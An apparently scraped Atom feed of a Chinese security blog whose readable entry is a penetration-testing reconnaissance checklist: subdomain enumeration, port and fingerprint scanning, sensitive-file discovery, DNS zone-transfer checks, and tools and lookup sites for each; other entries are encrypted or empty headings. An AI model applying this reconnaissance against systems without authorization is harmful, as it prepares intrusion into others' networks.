<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忆时光</title>
  
  <subtitle>忆时光</subtitle>
  <link href="http://lvpsectime.github.io/atom.xml" rel="self"/>
  
  <link href="http://lvpsectime.github.io/"/>
  <updated>2020-07-11T04:12:30.252Z</updated>
  <id>http://lvpsectime.github.io/</id>
  
  <author>
    <name>ca5tle</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>日志</title>
    <link href="http://lvpsectime.github.io/post/32353.html"/>
    <id>http://lvpsectime.github.io/post/32353.html</id>
    <published>2099-12-31T16:00:00.000Z</published>
    <updated>2020-07-11T04:12:30.252Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dd149b59167834316f5d96ad27cb5909771fe1db9fa0372426db74a433337cd0">94818f561542136a5f12a1f20ba90f292bf3a19ace642ed5d0b7a732ee6f3562cf75a38afd7c36827cbc2231cae2b2b80761839e52bbbb8bb934457935c03658057c6270eef480af3c6af75c54d973c68d6167268604822bff76369cceb2a90480ea813d876d27896586adfd69ee4082764569b9e6ab4aa4e6f7325ff0312ece74d9eca0d66d98730bc8d17d0b6028db9153ca311f8ccddf5ebae4792a9d7c0b9c5211cccc5ba1a1374b32e9e9381e951aa3959b8abbeb5f157c1d1309b90f909c2b646c5a3c01a448b52fcbf21cfaae08868f3aa150288f0cdd009d1d866c7a00e89e35311302d1139c065617a62ae511e4ecaee9321c0e78f569a7fe1c995b008c93877dd564caa2d9153004dcb67a81f6fee948b5a523d2e36f9e818ba1ed950827dc2e6b34278ef439075dbc2158cbf769491b5aa44ab04081a6be05466e018f064fcc733bb07e92ea8d5a637970af23594e3f44fc9ca1bf437d420be9993e1d029535d83a573e549304622e69ea402e1de180a21208f3f2bebd09277d819d2cda9f1095f4226cf612dbb16bcf211463e9dc98aa221341e094d72d51d296002ee1012fa50a3cfebf17ce5bd7c79c671fd18836a775b41ec36826d02b492653eb70d2508f82e96708a8269fd59df4957fcdcc982d60fbc8ba2157c81ba8b7ce3e4ddce8c5d3ac26ba761199d97c8c6549e170204bba40ec29cb7077456043696eacea8408ffb2aa9e4e284cda0cc5b20bae164365911b2acda36db9458147293ade1634262d6b802ef068b12e499cdfcc1e917b5fe7c49784bd3f921663f08a7f9ac70ba994cb9e3a03ffbaa14faa99aa1c617381d0aa956966a933e5d4a49f710e9a24e0ac62708566d78353dd1c1da02c925465559f481d17d623cd5339c1643061c4490e75de8f67776637746ebc336c511fef21a5cc607077aa1e377b3c343f6a4e2337cce10ab0494bfa7924cf586bbdced65af9b19702cc4ae4e10f618a06ce6c4807f9f9352990df81df3afe3cffb158a329c8d814cd2c2fce43c71a4b9b1b195a61714b6578111b44fda713167d7f17742f804c0c6a6cc79263d7e1c9d4fc40cc1de3999f03d69e4d32d3abf1c9a678a553785b6f40f87d42d4c4f7d0f7ca1943bae1154418596bf1a8dd56ebda3f3437c851190a54d67d69ab9b426c77706668b953b87db80ef1f8cfebdeb58121df0f5b78a650670cfa82ad650ddb35fb51690bff35d618e4a14b17d4968fab8f51919384d72135f831f844cf9a5a405ff37ef06191199fc382c44f7d9d273ffd0e5bc2526e42894c0363ea9d6a871c5a5067513cca4fe4396cdbdbb1f97f9cf4fbe2d582fec3c2d3ed60d743fa0b5b1339ae5400f61d9b309ba768326a69030c444a316873c6d52f5aa4afb90a63d68c89cd86ad36d78b50a626b2e25d497d021f00d58eec7712328dfea26b660fd5c6ebbf66423c84a2c341a35cff5da3f56e864232435b6257ab161b547fa93064a1540d433410fe671c38ee4a9d8910f21b2436681af6f7ad706ba1e9287501e8a427022254be9b400bea8480f40554dd35ed86450baf061e665aae0d68464235398c377465299f748697ea033d94c7c04c9c95e2bbb3ad72c03295ba177af8ac1cb216e91a1a8173240ab5f61f7f5a8865877533f82754482f86b7c2fb3a52d1e669e730e168a03bfc0ede8d315e6e64d36db1fee7d4dc0523db7cbc2dea5ad33c0b6a49e528fde858610a56e6663c9fc3b17417e58d29b8e73149077b8d2e475db2fc4c0d2a1960dfaadae85443c8ba9e16ea5b12edd6e1d348abb6b150559466a34aa23012241e93f68ad208842a7dd9d0f0c8c3e44ddb2892c824cb21669ce44d046087bff4dbba8ac1152cb70880eadf7bf6970db30a5fb9a44c84abe7e69bc66bd2c240fe9056e8fb56879eaf3c11eb92ad17548dfa81173475392a7193f9510ae833aaac610afbe5d14d26670b780e7cdc4f900e0004d0bc5d3e1058d5e1c7a0dd32149dcbc76c8e39eb3fc38c6a6ed728489d11f90d8a66e8c56803f3fb94b727c414a1814fb3534eadac20a9811a6bd59da314e495e53bdead7f7ce8200adc6d4531f7158d574d8ccd782dc770d43e8d87fe10775e048156dc35b4f82ceec9ff1e71ae31a117259fe0a264b07ba16ac5fb0b3981105f1986a06439cfb8f4dd59b02688c324fd634600518dd08ebad8299d6e12a9e65caefe62139fa38f320f0e6e2b756563ca7cd2e3006353a1ad3d18fd431e31f1d30ef5a4db5b2e0239dc8ffebc20188a619272ef1637974f0cd13cda9f5cd7fce80e546ec3db11d614f7c4fb85f925af58d2ac542071e0e20f1cbaeb9bc25fece5639f4f00539bc3c94bbb5feaa44656b1dde8619490c39a54f5bbaf1df4858597bb13a5803a2275ce0bf6ce2c934c66978d261fdf6a7ab9f1671772e46844c995e24ab1e2db2923b9389b5fa2398706c188b1977bbdfc2b920358f1e5a5260d1dbead6513fff481f6216b3d4b108ba2d6e9fd528eb79bcc4a780b83b4107377a342d9fa17559d35a6132e18ef73f57bdae78d14fc439571fe589f562b0bfaf43e45329966bcb4e3a616c95164ad7337c39f2e9997e951649092ad2921d426e148fc0dc315d63592adccbe80466d911666c63369f14cf659ed4a2c5d951900139985f6b6cd5bbb1a3ec0f2ee8ae83c7a4a86884c4535af6e31f97ab8e573d1e11373c4d08bbaf64146925db6246ef5902fc181e98943f4a6bfbfeffc0733fa0a94ecf11cd2e367e1d4703808f7183de3637adfaf78c89f0572a3658e0f632ff18be9c16de0cf6a190875cfdd9392a1436ed7c4717ac2f2181eb06dfc96f061a4debf2b3b20359fb175c807535cc0a282ab59db4bce58a4edf6f580643d60ded117a4c2aa8ca1f8cf41ce9c0c627d38355391a6a61c582097ba6badecec5ff3772a4ec7481c6d9ea65487c9ae157a420f51bb24e3d3d8dfe7decacda81bcf77fbb145f7852156fdbacdc440aeb3a340c482dbd39c341d0f5cfcc1826bfc7330ca84e0ea911e8487d0d65296d59537065e59efc03dbc64b31df03d94b7e1c9e2fee3e2080ac31d3db8356804c1cfb8ea9d6acb4465d406aaf80cb42209a3e5a8270c107a1bd3e699da5a16c470d3ecb757f88d7cabb18f74d18aa318c757213ea9b7c102ce435547e21320f9e2f6866d0e547ddd7334ca3bfbcfc06c7a466456db604e855e9e2793b5818d80b54d08b2e0dfa41aa6b7bf588b0b8f94cbb82763358fed9577378c8745a53cda30a487b004ca11e826e3954643d68edcea467f222d88c1885ef37636cc0cab719807d032d2a54ffea6b0cc4081df58731b4666d06542803b5b0b11e26341c2277d7e4702e325d98e42da8e1d1055da80ef03f096479cc08e1022009ecc9f7994f431e8a0795678e6c29316f91cc65f00c27e00da691878124e3587671e0b60ec9ca16efe148bc513b432e65470d8be898c22595ccc7bc0746db0b0e1deb1529909649d9da451158bfd94ea7c9b27f47a1fbc8763c3be5862171fed4861c3645dcc0aa667fc15d60a257ab9d8b8701ec1eaf3b9ce7a124989fde3dbc1421d31e064461a47f207700510c9f1c9ce0c00933833d0205690708df2faac448d600ed7a4f84df52f04e064651981ec1c9a1b4046b1b670f6d19e15f27cedc75d5824140e35ffb2ba4a685692a70f7fd14a10bea91d1bf9b0f59bd8ad47afe9cfa72cc08aebc3f1e7f0da08ad7f2a14866561574eec6319a0f71719e0d8bb911c1035a68b638da29d377344e087606235a9534a932829edc012236a92da37bee71bb3f2a096e357d2ac0ca1a563d1cfa4ad8401c6a8c37d95b0b84f2702546afdedae042bc408ced42bd1748376d7a855b0444561a7d27bfa1542d50dfdd91ed9487967f207e6f07212cf6e653ff07cfae3ec068726e25ce1e87d482ab9c1c3504dfc8f889c87d5e19b662b7c3ea4f335bbb37925ca0eb6e4e8888a90f58f8966fe143d4c948f303f5f3585a37848628f6688e2f1090cd8eb4e504b3a2fcc61021682bc2347704c0ec4ad380359cb5c88935347a7c1fbd581005b492fe76ae821683f052426539c345aaed79eb2af38689cdf1a355e8d866619ed4d55795a362946d8a4b9c5e802e4a04c8fccd8f99e2f5f9582dc47c26fb2185a66c461468b6bf8ce442f683b2d01e4895d1a4c340fdeadff30652712ac99c3bf2d81264411914dc4443f2fcbd31d5d7550e78baedd4b63c7b727d97a509b416e78c58fb1e2400e97c00bd71c7e5f40c28108ef318038abe82f2109636ab7e1f16e01517f549f3bafefb3cd5fc0dec5468f5e8a87e8834f9c8a43298b8625d7df68219b8530a29df2a4668d4f00b84e34cb94958a2df4480d613e8ee3e5ee3e5b8dab715392169a3968448fcd9f647d3c6df0df029c7e09d1df6df899064d355ac2c5b4c648aa5cc6ce492cdf5d2d23df8b1ecf07208e4fcb82705c29b4415186bab602477f9b0bb7a80e9f8e35bbe5166490f885aea59031e507b64562eaa0549be1d3b52a93e3069169f991964cffa3da99cf81888374fff5bda954f0f3a192da742c6d5da1b9f9b4aa56345023b7a9ea6978eeb96f4e614a28e25df6875c03768374ee1d5722164b625f6b2f228323d1fa8898b7b208e52c52947c3c4bd0d601f4ec60f9d0b44466473e974ecd52e1d45913ae95d70d3ceb733042b3e8239ba783b82fed3b1887e5922a032abba091c4878aae3bfd75c0982ec4414c5349905e9e6c291e23a7e29999230ec7c2a1c49bd1f73346c586b12b7eaeb09698a40cd762025d9cf321034ea1a2fa16db162554db23229c2ee5db242a617e4d0019d7b934cfddeccd1854e5e7dc2612cc25af474533e6e755fda36d1f3e6522fc9eaa2fdd2aa5cc68944b4ce6ec35d6a55c1252a9838f97309751e230ddce4df8af3b7e181bb64971ccb7ac44f4ee8b971b878861791e31e3f64f67ce29de2eb20e748db27ff4e851018ea9bd8f0d5df5cc0d7f4d0e8f48d30d8eff02ff0182ad0889b07f30afdcc8b6879e8a62fbdc769bf33956b2d100ead14663fa71f77a2217ae95f8df9b86c5670bd102c6ce082ec4531c3b459405900a10aff03e63f0bba7b891e172bd0301198e5ac757bad0d67cf1bda7b613d8f5029caaff4d9e45a386c2838da6cf402313fbd870674cf9e6b1e115803b1b92d2f90dca50a65b2034efd6be9c56eb465e1b4d2e502ea191ace07d92b945b3aa93fdcd1307f0a56be49bfc189f9f6fa7c984f24108d3e84c2d92c56127f29ee1c7ac720dea87fa9195701a72edd96f028aba586e5083603782aebcc8ff3ae2f2a0ec22ab409c588466e01eff60e3d7ff1985a6dfbb56db906388924cc4c6e4989e90d8acc63616fd658c8647aa1478c18ae35aeb7882baf1acb3166af5bfa13975dce62ee7fea6695d8a024357516a0a050fcf9140f81ba29c8bc0fbf90f564d99ebfbb989deaafa9a9a77f118e6adb65e92ea9bfe77b0356a8b954c63cdc33f42cebaa85ecdfc2147910dd4f0dd4ad0b4ef070704dd193e05f14f476d8bca4bab26f9be87c7c032114f731711c5248650edcd9c96391e2ff076a16ffd15efa72df7c1704ceb57ecf8d59edd88536c4aa32d74432a5631a0c800828add1359dca72cf1be2bd8f51d8b01b886141b3665a0294e38c00c6a5e08da645b844699347ae0b3583dd2e8cc92f4deceb65180a908d04a405c40ac7ea2bea658a5103228700a178b6d79bcdb8a0588a5c1b769a3e0f11d9c76b5152aae7b36022abfff869e9bb17443a19cebe4d6e17e936cc1daca7ceed6fba24d96436fc55a594049d8bbb79967a1a521a49fa583561799c6a476ed1d639b3a9c59612e5b5f1efaae8e0f36f891a0674661a1b049dd9c565dcb1215ec1777ef800daf3015b19a041e51649ae9f25f0bac7f26e53280793d1490e00fa6cf287161daf744ec92fb1550a8e00be47eafa1299808fd5fa69990a25844a0ed67850e7965f1f379375cc7c4aa0b1e4f9201041e5931f581e5aea625e1506c87750662ae7ab9b14cfe2b39405fdf9926e8f61ac99abd1402812ce6812fa2f9751fbecdb62db6b79d35704b1caf54ae64428439952880f10054564675847e37046110023a5696052fc3b1753e3da6f55fbb03559a5d75b327e4d7f0f598c0efdd3ab9b1b5e5613e4d5693e10e6e65a14a5d7703b256bc659404d1de9b49e851f26f8172a085e0ad974de61a67504d946154b52bb76b299251ec88fa3e58a884bf8827cc5e2b528aee40b9ee214e539f33fa42b7fb379747d9433495b1dab0ed200d25a7b373eae8f96546ca9b58992f0d8ca235a79298934d816229e83e1cb72ec65a300977ca63529767126f05e5a111c4706945574cec1862eb46f76f7d7c04aeef41e714871a78dc2e479cc52a6df2396c5ca280163c6f987b77d12d0cb10ce18f7d6d46fe35696f16346a1ca0512c4ed09ecf23bc1d2a5f188bcd8fff42d19fdd9d8c2dc963e6273c4891a2c50b2a389c2da44bab5aaca680a8e161875b89ec651ad7b64d8834269cf69e6bc9f2db6dd904c292abe21533f1b91317797b09a8926b497355e066505ee35a8c2b34c1af6487613bfde45205b5408b989f87fbe34011d33b091ccd11b7022d5f5bcdd2bd0e7f311301de274d56c5ffd14ccce6f49931956aa83b91ee6c3d79d5e9d03b16cc4493e7d393a83106367c32694134035b3172e7b9b36baf2a9f21ce315afb3eec9576d29dbf2a886259941ac91d6b7bf1b0a9ab14a43e138252923ac3a69543c75777b27aed823b2c8a3f962565433d3f281711b9e7959ef760e9e6b8185766121e954bd7bf79beb5332eda364ec09d1ac264200198e5356e2c7caf5adcde9fb5e2eab252eaedfb41dc339096a437ef9f630276f3291bf217c7581b260c62742bb1ee86174031a6bfe0cc0135d8ba314f72f0316751861e43724958170991b65e91ae4e1429be649f3559f207f3c0289dcac435407c01998a201a3af2a1ec012c6ca45f5a5a3782e192b7ef9051653beaade16da1ce92c1f4a8b5b21b7e2f43b8dee9b0e88fb94592f410dafcd15eae4e29788ad4a314d4581d7bf654b4b5d3806a79a2d934494cf01c3488de0ce55eda9bd3e98d44d3bf953510a6ee2fed9145316902da419fce7a2f83129820d996aab03116ea97fe90b5cdf7b209fc3d49e235151a247b0eddbabba56764f0fe091733ca9fc13a903f1629ad30c3e429650030a3154e4b365b9c5b15432558e762bc944e291c60813eb8493e4fa153fe5d2e59fabf34115fb956c937e9937fdd54472856a8ca8fe0676dd1e321ae3ab35dee4d8c0883d3b3c77e262db67817270551867eb77631980327c825062eb200d6b4cb22cde9e72f5be3b0f940c7e011801244388b5bcbd0b363353b0995ec40e3efea31e7a359d2d5ef383c5be6528721bb4bc9d6de8ada947cc7589995eac7ba19ceab12000cb90a86d3b80af0764a57bc3a7f94dc0e854fc60a50ef7aa65ee1cd5da208ac82c3b7957e4b27b59f09873e6b51c56f0f5ad93be667f608e42f4e9a494fa698e4aa73b1b0711940edd9cec2453f541ef78ef65f8862135790bf555313c1e889e8eb4516958cf6445aa7d9510d6d118e34c546e02e255ef8ef16d5f3f162ee7092cc7e2db6dcab0ce7f3c6bcef3bbcc5672407ef21a99551eab5224b415964997ace5c876c5cdb4b2364c54276e93113782e65263aed8afdcc2afaf1403ff2aa2673cd212ce9765ea3c36ba5f6b0312a43f177615bdc1b97004d5eabd92ede1a17e9c0a3d82cf94e616ded810cffef388fb3eb87a42014eb975c2092ead65a5bfb7c783575f69fb885b66ebd4ee91a5280ace63de68f4170f779e39c37cc5295929075a42c9c745be94a41bfe2297f0ec0ea2db442b8a574c7f3e495e2ee94940f8f33fb19333e96725c85d284e25729e501e965085b723e72e8b442f61b5caaf83b68f9a34290227967d00c1a577d178ab9c425127dca62a00cd0716854bd67f7c28c86881c2672885f92a82d9b6c64239d0e5b91a5ac74b9ec6a449e811e2ad063b136ffa945984abbd79c81abccdfb77b03c6e2063a6b3fe6f6cf8fdae4d0ebbcace5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码，查看文章！</summary>
    
    
    
    <category term="日志" scheme="http://lvpsectime.github.io/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://lvpsectime.github.io/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>日常记录</title>
    <link href="http://lvpsectime.github.io/post/42951.html"/>
    <id>http://lvpsectime.github.io/post/42951.html</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2020-05-13T10:20:55.193Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7df5b8465111e41a59a7884c759ee30040c27f13240aa4832a50e3d9fefdd4f2">94818f561542136a5f12a1f20ba90f292bf3a19ace642ed5d0b7a732ee6f356291acce8d765a8c51aa6403fac6065f2195c68e3ae23a722d61230070b29d8eff9b0761a0090e209ce54bc36e46778aa9dd3c3e47871c650a19088ddc5d156410a10a6f99ddd9ad8b30d5c084268046a64621dd7b65211d4393c7ddfdf06fdd078bf81dad5fe75f051095af30252f56785c36f1e7b4cbac193433d9e4d71910a3e843d7870199e56b7159e10a7bc4ca7ff4bbc4d750b03224c5702a3147243ba1fa3e0297c94e3948bc75fc75bb4c5932dfa23cd3ed31fdef559b7befc857c375</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码，查看文章！</summary>
    
    
    
    <category term="总结" scheme="http://lvpsectime.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="备忘录" scheme="http://lvpsectime.github.io/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>易错知识</title>
    <link href="http://lvpsectime.github.io/post/34260.html"/>
    <id>http://lvpsectime.github.io/post/34260.html</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2020-04-25T03:09:14.921Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="06053897d46f2797eddfaba62c70d810ed7cb9afc21e75cb7356dae6f181cd97">94818f561542136a5f12a1f20ba90f2919a48bd43004e11595d49f1293aa0322</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码，查看文章！</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>内网基础知识</title>
    <link href="http://lvpsectime.github.io/post/2bfd09c1.html"/>
    <id>http://lvpsectime.github.io/post/2bfd09c1.html</id>
    <published>2021-09-11T14:22:01.000Z</published>
    <updated>2021-09-11T16:23:14.535Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><h2 id="域控制器和活动目录的区别"><a href="#域控制器和活动目录的区别" class="headerlink" title="域控制器和活动目录的区别"></a>域控制器和活动目录的区别</h2><h2 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h2><h2 id="域内计算机的分类"><a href="#域内计算机的分类" class="headerlink" title="域内计算机的分类"></a>域内计算机的分类</h2><h2 id="域内权限解读"><a href="#域内权限解读" class="headerlink" title="域内权限解读"></a>域内权限解读</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;工作组&quot;&gt;&lt;a href=&quot;#工作组&quot; class=&quot;headerlink&quot; title=&quot;工作组&quot;&gt;&lt;/a&gt;工作组&lt;/h2&gt;&lt;h2 id=&quot;域&quot;&gt;&lt;a href=&quot;#域&quot; class=&quot;headerlink&quot; title=&quot;域&quot;&gt;&lt;/a&gt;域&lt;/h2&gt;&lt;h2 id</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://lvpsectime.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>信息收集总结</title>
    <link href="http://lvpsectime.github.io/post/ba3bdb90.html"/>
    <id>http://lvpsectime.github.io/post/ba3bdb90.html</id>
    <published>2021-08-16T12:59:27.000Z</published>
    <updated>2021-08-17T14:56:33.350Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="要收集的信息"><a href="#要收集的信息" class="headerlink" title="要收集的信息"></a>要收集的信息</h2><table><thead><tr><th align="center">收集清单</th><th>详情</th><th>工具</th></tr></thead><tbody><tr><td align="center">基础信息</td><td>1. 注册商 <br>2. 注册人<br>3. 邮箱信息<br>4. DNS解析服务器<br>5. 注册人联系电话<br>6. 企业备案信息</td><td>1. whois<br>2. dnslookup<br>3. 天眼查</td></tr><tr><td align="center">域名信息</td><td>1. 系统域名<br>2. 子域名</td><td>1. OneForAll<br>2. subdomain<br>3. subDomainsBrute<br>4. 子域名挖掘机<br>5. 在线网站</td></tr><tr><td align="center">端口信息</td><td>1. 开放的端口<br>2. 开放端口对应的服务</td><td>1. nmap<br>2. msscan<br>3. 御剑</td></tr><tr><td align="center">系统信息</td><td>1. 操作系统类型<br>2. 中间件类型<br>3. 脚本类型<br>4. 数据库类型<br>5. 服务器类型<br>6. web应用信息<br>-  Web前端框架<br>- Web应用框架<br>- Web开放框架<br>- 指定路径下指定名称的js文件或代码<br>- 指定路径下指定名称的css文件或代码<br>- display:none中的版权信息<br>- 页面底部版权信息，关键字© Powered by等<br>- 注释掉的HTML代码中的内容<br>- http头中的X-Powered-By中的值，有的应用程序框架会在此值输出<br>- cookie中的关键字<br>- robots.txt文件中的关键字<br>- 404报错页面<br>- 302返回时的旗标<br>7. 系统后台<br>8. CMS指纹<br>9. 漏洞库信息<br>10. 编程语言<br>11. 编程框架</td><td></td></tr><tr><td align="center">文件信息</td><td>敏感文件、目录<br>1. WEB-INF/web.xml文件<br>2. 网站备份文件(.rar、.zip、.tar.gz、.bak)、配置文件<br>3. 数据库文件<br>4. SQL注入<br>5.未授权访问<br>6.robots.txt<br>7.后台目录<br>8.网站安装包<br>9.网站上传目录<br>10.mysql管理页面<br>11.PHPinfo<br>12.网站文本编辑器<br>13.SVN信息<br>14.crossdomin.xml<br>15.sitemap.xml<br>16.测试文件<br>17.DS_Store文件<br>18.vim编辑器备份文件(.swp)</td><td></td></tr><tr><td align="center">防火墙</td><td>WAF探测</td><td></td></tr><tr><td align="center">IP信息</td><td>1. 旁站<br>2. C段<br>3. 真实IP<br>4. 别名CNAME<br>5. A<br>6. MX<br>7. AAAA</td><td></td></tr><tr><td align="center">内网入口点信息</td><td>1. 企业邮箱登录口<br>2. VPN登陆口<br>3. 各类OA/crm/sso系统的web入口<br>4. 各类中间件web页面管理入口<br>5. 各类监控系统、防火墙、虚拟化、路由器入口等</td><td></td></tr><tr><td align="center">综合收集</td><td>1. Maltego互联网情报收集<br>2. Recon-NG信息侦查收集工具<br>3. Kali/Parrot中的其他信息收集</td><td></td></tr><tr><td align="center">社会工程</td><td>1. 企业基本信息<br>2. 员工信息（手机号、邮箱、姓名等）、组织框架、企业法人、企业综合信息等<br>3. 网盘信息</td><td></td></tr></tbody></table><h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><ol><li><p><a href="https://github.com/shmilylty/OneForAll">OneForAll</a></p></li><li><p>Google Hacking</p></li><li><p>空间探测，fofa、shodan</p></li><li><p>爬虫，burp，awvs</p></li><li><p>IP反查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://tools.ipip.net</span><br><span class="line">https://dns.bugscaner.com</span><br></pre></td></tr></table></figure></li><li><p>证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://censys.io</span><br><span class="line">https://crt.sh</span><br></pre></td></tr></table></figure></li><li><p>人工查看https证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">证书  ---&gt; 详细信息 ---&gt; 使用者可选名称</span><br></pre></td></tr></table></figure></li><li><p>DNS A记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackertarget.com/find-dns-host-records/</span><br></pre></td></tr></table></figure></li><li><p>APEX_DOMAIN 记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://securitytrails.com/list/apex_domain/sony.net</span><br></pre></td></tr></table></figure></li><li><p>DNS流量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdumpster.com</span><br></pre></td></tr></table></figure></li><li><p>DNS域传送漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DNS服务器配置不当，导致匿名用户利用DNS域传送协议获取某个域的所有记录。通过可以实现DNS域传送协议的程序，尝试匿名进行DNS域传送，获取记录。</span><br><span class="line">可以用Nmap检测，还可以用nslookup、dig检测</span><br></pre></td></tr></table></figure></li><li><p>爆破枚举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在线</span><br><span class="line">https://blast.uixsj.cn</span><br><span class="line">https://z.zcjun.com</span><br><span class="line">https://phhpinfo.me.domain</span><br><span class="line">本地</span><br><span class="line">https://github.com/lijiejie/subDomainsBrute</span><br><span class="line">https://github.com/yanxiu0614/subdomain3</span><br><span class="line">御剑子域名挖掘机</span><br></pre></td></tr></table></figure></li></ol><h2 id="真实IP"><a href="#真实IP" class="headerlink" title="真实IP"></a>真实IP</h2><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><h2 id="旁站、C段"><a href="#旁站、C段" class="headerlink" title="旁站、C段"></a>旁站、C段</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h2 id=&quot;要收集的信息&quot;&gt;&lt;a href=&quot;#要收集的信息&quot; class=&quot;headerlink&quot; title=&quot;要收集的信息&quot;&gt;&lt;/a&gt;要</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="http://lvpsectime.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>常用工具列表</title>
    <link href="http://lvpsectime.github.io/post/51461.html"/>
    <id>http://lvpsectime.github.io/post/51461.html</id>
    <published>2020-12-31T10:41:19.000Z</published>
    <updated>2020-05-05T12:45:45.676Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" 